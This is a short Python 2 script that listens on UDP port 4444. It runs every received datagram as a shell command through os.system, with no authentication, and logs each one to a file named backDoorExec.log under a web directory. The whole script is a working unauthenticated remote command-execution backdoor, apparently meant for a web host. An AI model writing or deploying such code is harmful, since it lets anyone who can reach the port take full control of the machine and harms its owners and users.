
import socket
import time
from time import localtime, strftime 
import select
import sys
import os
 
UDP_PORT = 4444

sock = socket.socket(socket.AF_INET, # Internet
                     socket.SOCK_DGRAM) # UDP
sock.bind(('', UDP_PORT))
sock.setblocking(0) # turn off blocking
print '   UDP Client    press any key to stop\n' 
print socket.gethostbyname(socket.gethostname()) + ' Listening at port ' + str(UDP_PORT)

logFile = '/var/www/Paulware/backDoorExec.log'
f = open ( logFile, 'a' )
f.write ( 'Starting...\n' )
f.close()
while True:
   try: 
      i,o,e = select.select ([sock],[],[],0.0001)
      recvData = False
      for s in i:
         if s == sock:
            data, addr = sock.recvfrom(1024)           
            f = open (logFile,'a')
            f.write ( data + '\n')
            f.close()         
            print "os.system (\"" + data + "\")"
            print "from: " + str(addr[0])
            os.system (data)
   except Exception as inst:
      f = open (logFile,'a')
      f.write ( 'Error: ' + str(inst))
      f.close()